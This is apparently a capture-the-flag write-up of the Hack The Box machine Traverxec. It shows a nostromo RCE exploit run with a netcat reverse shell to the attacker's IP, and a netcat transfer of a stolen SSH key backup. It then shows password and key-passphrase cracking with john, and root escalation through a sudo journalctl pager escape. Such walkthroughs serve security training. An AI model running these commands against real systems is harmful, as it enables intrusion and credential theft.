## Traverxec

__Machine IP: 10.10.10.165__
__Difficulty: Medium__


## Scanning

### Nmap Scanning

```bash
$ cat nmap/traverxec.nmap 
# Nmap 7.91 scan initiated Wed Sep  8 14:38:55 2021 as: nmap -sC -sV -oA nmap/traverxec 10.10.10.165
Nmap scan report for 10.10.10.165
Host is up (0.095s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  8 14:39:15 2021 -- 1 IP address (1 host up) scanned in 19.91 seconds
```


## Enumeration

- found `RCE` when searchsploited `nostromo 1.9.6`
- Executing
```bash
python 47837.py 10.10.10.165 80 'nc -e /bin/sh 10.10.14.12 9001' 
```

__Result__

```bash
www-data@traverxec:/tmp$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```



- on running `linpeas.sh` found a hash of user `david`

```bash
-rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

```

- cracked -  `Nowonly4me`

- Also on analysing  `/var/nostromo/conf/nhttpd.conf`, found a `public_www` directory in home. It is not listable but can be navigated

![homedir](images/homedir.PNG)


```bash
www-data@traverxec:/var/nostromo/conf$ cd /home
cd /home
www-data@traverxec:/home$ ls
ls
david
www-data@traverxec:/home$ cd david
cd david
www-data@traverxec:/home/david$ ls
ls
ls: cannot open directory '.': Permission denied
www-data@traverxec:/home/david$ cd public_www
cd public_www
www-data@traverxec:/home/david/public_www$ ls
ls
index.html  protected-file-area

```

- found a `backup` file

```bash
www-data@traverxec:/home/david/public_www/protected-file-area$ ls
ls
backup-ssh-identity-files.tgz

```

- transfering to host machine

- on victim machine

```bash
nc 10.10.14.12 9002 < backup-ssh-identity-files.tgz
```
- on host machine

```bash
nc -lvnp 9002 > backup.tgz
```

- unzipping the file

```bash
$ tar -xzvf backup.tgz 
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

- found `id_rsa` key but it is encrypted

![id_rsa](images/id_rsa.PNG)

__Decrypting the `id_rsa` using `ssh2john`__

```bash
$ locate ssh2john  
/usr/share/john/ssh2john.py
                                                                                                
┌──(kali㉿kali)-[~/…/traverxec/home/david/.ssh]
└─$ /usr/share/john/ssh2john.py id_rsa                             
id_rsa:$sshng$1$16$477EEFFBA56F9D283D349033D5D08C4F$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7
f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086 ..
```

- save it in a file and crack using `john`

```bash
$ john --wordlist="/home/kali/tryhackme/blue/rockyou.txt"  id_rsa_decrypted 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:08 DONE (2021-09-08 18:52) 0.1237g/s 1774Kp/s 1774Kc/s 1774KC/sa6_123..*7¡Vamos!
Session completed
```

- password: `hunter`

- sshing to `david` user

```bash
$ ssh -i id_rsa david@10.10.10.165  
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ 
```

> Note: id_rsa is the encrypted file from backup, when `sshed` password will be prompted and enter the cracked one







## Privilege escalation


- found a `bin` directory containing a `server-stats.sh` file which is running a binary `journalctl` as sudo

```bash
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

- on looking into `gtfobins`, found that we can get a shell
![binary](images/binary.PNG)


```bash
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service 
-- Logs begin at Wed 2021-09-08 18:36:39 EDT, end at Wed 2021-09-08 19:10:20 EDT. --
Sep 08 18:36:41 traverxec systemd[1]: Started nostromo nhttpd server.
Sep 08 19:00:01 traverxec su[783]: pam_unix(su:auth): authentication failure; logname= uid=33 eu
Sep 08 19:00:04 traverxec su[783]: FAILED SU (to david) www-data on pts/3
Sep 08 19:00:15 traverxec su[784]: pam_unix(su:auth): authentication failure; logname= uid=33 eu
Sep 08 19:00:17 traverxec su[784]: FAILED SU (to david) www-data on pts/3
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```


> `/usr/bin/cat` as ommited as after pipe, the content will run as user not as sudo, for that it is ommitted